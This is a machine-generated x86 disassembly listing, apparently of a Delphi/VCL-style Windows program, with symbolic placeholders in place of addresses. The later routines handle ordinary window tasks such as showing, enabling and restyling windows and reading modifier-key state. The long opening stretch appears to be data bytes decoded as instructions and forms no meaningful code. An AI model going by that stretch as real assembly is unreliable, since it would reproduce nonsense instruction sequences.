add esi esp
jg r-xdata
inc [ esp + edi * 2 ]
add eax [ eax ]
adc al 0x7e
outsb
je r-xdata
sub [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0xac
add edi [ ecx + 0x2 ]
add bh bh
jns r-xdata
and al 0x0
add eax 0x336c7443
inc esp
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx ebx
add [ eax ] eax
[ eax + 0x7f ]
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
and al [ eax ]
adc eax 0x6e617254
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0023 ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
hlt
add bh bh
and eax 0x73550e00
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
fadd [ ecx ]
add bh bh
pushad
stosd [ di ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp - 0x38 ] 0x8f03aa9e
add [ eax ] al
dec [ edi + 0x1ff0000 ]
jb r-xdata
jo r-xdata
jae r-xdata
adc al 0xa0
stosb [ edi ]
add esi [ eax + eax ]
[ edi - 0x55 ]
add eax [ ecx ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ es : esi ] cl
inc esp
popa
jne r-xdata
stosd [ edi ]
add edi [ eax ]
jle r-xdata
imul ebp [ esi + 0x74 ] 0xa6100073
add ebx ecx
add [ eax ] eax
call [ esi + edi * 2 ]
add bh bh
sub ch bh
stosb [ edi ]
add esi [ ebp + edi * 8 - 0x56 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050020 ] al
outsd
insb
outsd
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add edx [ ebx + eax ]
inc [ eax + eax * 8 + 0x103ac ]
add [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add dh bh
push 0x84fe0000
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
je r-xdata
[ eax + 0x103acc0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
adc [ edx + esi * 2 + 0x61 ] dl
outsb
jae r-xdata
adc [ esi + 0x35003 ] ah
imul esp [ gs : edi + 0x68 ] 0xa6109474
add eax [ edx + eax + 0x284ff00 ]
outsb
je r-xdata
sahf
stosb [ edi ]
add ebx [ ebp ]
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
outsd
outsb
dec ecx
imul ebp [ ebp - 0x78 ] 0x5003ac13
add al [ eax ]
[ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
hlt
add bh bh
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4808002e ] al
js r-xdata
add [ eax ] al
add [ ecx ] ch
add [ eax ] cl
inc esp
jb r-xdata
add ebp [ eax ]
add [ eax ] al
sub [ eax + eax ] 0x4
inc esi
add bh bh
jl r-xdata
outsd
outsb
je r-xdata
stosb [ edi ]
add ecx [ esp + edi * 8 + 0x3aa ]
add [ eax - 0x80000000 ] al
sub al 0x0
add al 0x46
add al [ eax ]
jmp [ eax + eax * 4 ]
and ebp [ ebx + eax - 0xfffd89 ]
and al 0x80
lodsb [ esi ]
add esi esp
jg r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ ecx ]
add bh bh
mov ah 0xfc
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x6f460900
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : eax ] cl
dec eax
sub [ eax + 0x28803 ] 0xffffffff
call 0xffffffffffafdcad
jg r-xdata
add edi esp
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
[ edx + esi * 8 + 0x6aa803aa ]
insb
cmp al 0x10
add bh bh
add [ eax ] eax
add [ eax ] al
add bh bh
test [ edx ] al
arpl [ edi + 0x6e ] bp
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add esi [ ebp + 0x2 ]
add bh bh
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002f ] al
sub_3ac395c
sbb al 0x62
lodsb [ esi ]
add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add eax [ eax - 0x43fc533f ]
sub [ ebx - 0x547737fd ] 0x3
adc al 0x88
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
inc ebx
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi eax
retn 0x3ac
sub_3ac3a66
lodsb [ esi ]
add ebx [ eax + 0x2c03acc3 ]
les ebp [ ebx + eax + sub_3acc484 ]
push 0x8003acc5
lds ebp [ ebx + eax + sub_3acc1e8 ]
fadd st2
lodsb [ esi ]
add eax [ ebx + eax * 8 - 0x54 ]
add ecx [ edi ]
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x3b
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
lodsb [ esi ]
add ecx [ eax + eax ]
add [ eax ] al
rcl [ eax ] 0xa6
add [ eax ] al
add [ ebx + edi ] dh
pushfd
cmp ch [ ebx + eax + 0x43540f07 ]
jne r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
je r-xdata
add ecx eax
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
dec esp
cmp [ ebx + eax + r-xdata ] ebp
adc al [ eax ]
add eax 0x6d726f46
jae r-xdata
cmp al 0x10
cmpsb [ esi ] [ edi ]
add eax [ esp + eax * 4 - 0x7b13fc54 ]
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0011 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
push esp
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x8c00408d
cmp ebp [ ebx + eax ]
add [ eax ] al
add [ eax ] al
mov esp 0xdc03ac3b
cmp ebp [ ebx + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
into
cmp ebp [ ebx + eax + 0xa0 ]
sbb al 0x8b
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax [ eax + ecx * 8 ]
lodsb [ esi ]
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xchg esp eax
cmp [ eax - 0x57c523fd ] ebp
add edx esp
cmp ebp [ eax - 0x57c1f7fd ]
add ebp esp
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
lodsb [ esi ]
inc ebx
outsb
arpl [ eax - 0x70 ] bp
xor al 0x3b
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_3ac3bfc
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
jae r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3803a6 ] dl
add [ eax ] al
nop
sbb al 0x3c
lodsb [ esi ]
add edx [ ecx ]
andps xmm2 [ eax + 0x6f ]
jo r-xdata
lodsb [ esi ]
popad
push es
jo r-xdata
adc [ eax ] ecx
dec eax
imul ebp [ esi + 0x74 ] 0x6f666e49
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
outsb
je r-xdata
add ecx [ eax ]
or dl [ ecx + ecx * 2 + 0x64 ]
insb
inc ebp
jbe r-xdata
test [ esi + 0x408d03 ] ah
les edi [ esp + ebp * 4 ]
outsb
je r-xdata
or [ ecx ] al
inc ebp
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x1 ] si
insb
outsd
jb r-xdata
add al [ edi ]
outsb
outsw
add [ eax + edx + 0x100003a6 ] dl
cmpsb [ esi ] [ edi ]
add edi eax
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
je r-xdata
push es
outsd
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
outsd
outsb
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
add [ edx ] al
or [ esi ] al
inc ecx
jb r-xdata
stosd [ edi ]
cmpsd [ esi ] [ edi ]
jb r-xdata
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
sub al 0xd9
lodsb [ esi ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + edx + 0x3803a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x3c03 ] ah
add [ esi + ecx * 2 + 0x4c03a8 ] cl
add [ eax ] al
xchg esp eax
adc [ esi + 0x5003 ] ah
add [ eax + edx + 0x5403a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x8c03 ] ah
add [ eax ] bl
cmp al 0xac
add edx eax
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ecx
jo r-xdata
add eax [ eax ]
imul ebp [ esi + 0x67 ] 0x6e616843
inc ebp
jbe r-xdata
push esp
push ebx
push 0x6948776f
outsb
je r-xdata
add [ esp + eax * 2 ] eax
outsd
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
adc [ esi + 0x408d03 ] ah
add [ 0xe0803ac ] bh
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x4 ] si
inc esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x3c849003 ] ah
lodsb [ esi ]
add ecx [ eax ]
andps xmm0 [ ebp + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
dec ebp
push ebx
inc edi
add [ edi ] eax
dec eax
popad
outsb
insb
je r-xdata
jb r-xdata
cmp ebp [ ebx + eax + r-xdata ]
or [ ebx ] dl
push esp
push ebx
je r-xdata
jbe r-xdata
add ecx [ ebp + 0x3d000040 ]
lodsb [ esi ]
add ecx [ eax ]
push cs
outsb
je r-xdata
jb r-xdata
popad
jns r-xdata
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x544bfc59 ]
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 + 0xff003a7 ]
insb
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x25 ]
lodsb [ esi ]
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xchg esp eax
cmp [ eax - 0x57c523fd ] ebp
add edx esp
cmp ebp [ eax - 0x57c1f7fd ]
add ebp esp
xor al 0x43
outsb
add [ 0x6552 ] eax
jae r-xdata
nop
lodsb [ esi ]
outsb
je r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
outsb
push es
jae r-xdata
outsd
jb r-xdata
outsb
add [ bx ] eax
inc ebx
popad
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
outsb
outsb
je r-xdata
add cl [ eax ]
add [ eax ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebx ] al
inc esi
jb r-xdata
lodsd [ esi ]
add ecx [ eax + 0x10 ]
lodsd [ esi ]
add ecx [ ebx ]
push esp
inc edi
insb
popad
jae r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
or al 0x3e
lodsb [ esi ]
add ebx [ eax ]
mov [ edi + 0x5000203 ] fs
inc esi
outsd
jb r-xdata
int3
insb
je r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
pop es
add [ esi + eax * 2 ] al
insb
popad
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
inc esi
jae r-xdata
add eax [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
outsb
mov eax eax
fdivr [ ebx ]
lodsb [ esi ]
add eax [ edi ]
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
dec eax
cmp al 0xac
add ecx [ eax ]
or eax 0x73654d54
jae r-xdata
je r-xdata
adc [ esi + 0x1403 ] ah
push [ ecx + edx + 0x103ad ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add eax 0x68676952
add al 0x4c
insd
sbb al 0x3f
lodsb [ esi ]
add eax [ edi ]
or edx [ edi + eax * 2 + 0x6c ]
popad
jae r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x3e ] bh
lodsb [ esi ]
add ebp [ eax + 0x1 ]
add [ eax ] al
sbb al 0x8b
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
add [ ecx + edx ] dl
dec ecx
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
add edx esp
inc ebp
jb r-xdata
add esi esp
imul ebp [ edi + 0x6e ] 0xa6111400
inc ebp
jbe r-xdata
jne r-xdata
outsd
insd
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
add [ eax ] al
call [ edx + edx ]
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x68530c00
je r-xdata
push 0x4f746565
adc [ esi + 0x1803 ] ah
push [ ecx + edx + 0x103ad ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push es
inc edx
outsd
je r-xdata
adc [ esi + 0x1003 ] ah
push [ ecx + edx + 0x103ad ]
push esp
outsd
jo r-xdata
inc esi
jb r-xdata
add ah bh
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi ] bl
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi ] cl
lodsb [ esi ]
add ebp [ eax + eax ]
add [ eax ] al
nop
jl r-xdata
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x57c66bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
jb r-xdata
pop esi
pop ebx
retn
or eax 0x200
jmp r-xdata
les eax [ edx ]
inc di
insb
popad
jae r-xdata
push esi
call SetWindowPos
mov eax eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
cmpsb [ esi ] [ edi ]
add edx [ eax + eax ]
add bh bh
mov ah 0x11
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ 0x68676952 ] al
add [ eax ] eax
insd
cld
lodsb [ esi ]
add eax [ edi * 2 + 0x603a7 ]
add eax 0x6d726f46
jae r-xdata
jo r-xdata
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edx [ eax + edx + 0x103c03a6 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x53c1f340 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi ] bh
lodsb [ esi ]
add edx [ eax + 0x3ac3e ]
adc al 0x11
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
je r-xdata
add [ eax ] al
inc [ ecx + edx + 0x103ad ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cmp al 0x10
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add bh bh
mov ah 0x11
lodsd [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ esp + ecx * 2 ] al
add [ eax ] al
adc [ esi + 0x803 ] ah
sbb [ ebx - 0x5a ] al
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
nop
lodsb [ esi ]
add eax [ edi ]
or al 0x54
inc ecx
jo r-xdata
sub_3ac4034
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_3ac4080
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
push 0xffffffec
push esi
call GetWindowLongA
mov edi eax
test bl bl
je r-xdata
test bl bl
jne r-xdata
test edi 0x40000
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edi
and eax 0x40000
cmp eax 0x40000
jne r-xdata
push esi
call IsIconic
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x2 ] al
push esi
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x1 ] al
movzx eax [ esp + 0x1 ]
or al [ esp + 0x2 ]
je r-xdata
test bl bl
je r-xdata
push 0x0
push esi
call ShowWindow
and edi 0xfffbffff
push edi
push 0xffffffec
push esi
call SetWindowLongA
or edi 0x40000
push edi
push 0xffffffec
push esi
call SetWindowLongA
jmp r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx eax [ esp ]
and al [ esp + 0x1 ]
jne r-xdata
push 0x5
push esi
call ShowWindow
push 0x6
push esi
call ShowWindow
jmp r-xdata
sub_3ac4144
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3acfc94
mov eax [ rw-data ]
call sub_3a83918
mov eax [ rw-data ]
call sub_3a838bc
retn
xor edx edx
mov eax [ rw-data ]
call sub_3ace1b8
sub_3ac417c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_3a62ee0
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_3ac41cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_3ac427d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ rw-data ] 0x1
xor eax eax
push ebp
push sub_3ac423f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_3ac417c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac4284
mov [ rw-data ] 0x0
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_3ac4290
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_3a62efc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_3ac42c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_3ac432c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_3ac42c8
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_3ac4388
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_3ac43a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
push ebx
call __imp_GetWindowThreadProcessId
cmp ebx [ esi ]
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor edi edi
mov [ esi + 0x4 ] 0x1
sub_3ac43e0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
test bl bl
je r-xdata
mov eax esp
push eax
push sub_3ac4388
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax esp
push eax
push sub_3ac43a8
call EnumWindows
jmp r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_3ac4424
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_3acc958
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_3acce14
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_3a693f4
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3acc944
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3acce00
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_3a693f4
test eax eax
je r-xdata
sub_3ac44a4
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_3ac44fc
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_3ac453c
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_3ac4588
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ac45e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3aa9478
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_3a65488
mov eax [ ebp - 0x8 ]
pop edx
call sub_3a693f4
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac45ed
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3ac45f8
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov esi [ esi + 0x30 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
pop esi
pop ebx
retn
sub_3ac464c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
